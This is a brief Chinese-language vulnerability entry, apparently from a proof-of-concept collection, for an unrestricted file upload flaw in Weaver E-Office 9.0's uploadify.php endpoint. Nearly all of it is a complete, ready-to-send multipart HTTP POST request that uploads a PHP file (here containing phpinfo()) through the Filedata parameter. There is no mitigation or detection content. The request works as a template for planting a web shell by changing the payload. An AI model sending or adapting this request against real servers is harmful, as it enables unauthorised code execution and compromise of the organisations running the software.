### **描述和影响范围**

Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。

Weaver E-Office9.0

### **POC or EXP**

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.232.137:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
```

